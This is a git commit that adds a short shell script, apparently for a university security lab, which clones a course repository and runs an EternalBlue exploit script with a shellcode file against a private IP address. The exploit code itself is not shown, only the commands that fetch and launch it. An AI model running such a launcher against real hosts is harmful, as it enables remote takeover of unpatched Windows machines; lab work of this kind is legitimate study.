336c48f571cba99d9b4cd1e7c648cebedef853fc
luckystars0612 <18520609@gm.uit.edu.vn>
2021-06-12 22:29:33 +0700

    add shell_script.sh file

---
+++ shell_script.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+git clone https://github.com/luckystars0612/NT230.L21.ANTN--Lab4_18520609.git
+cd NT230.L21.ANTN--Lab4_18520609
+python eternalblue_exploit7.py 192.168.14.150 shellcode.bin
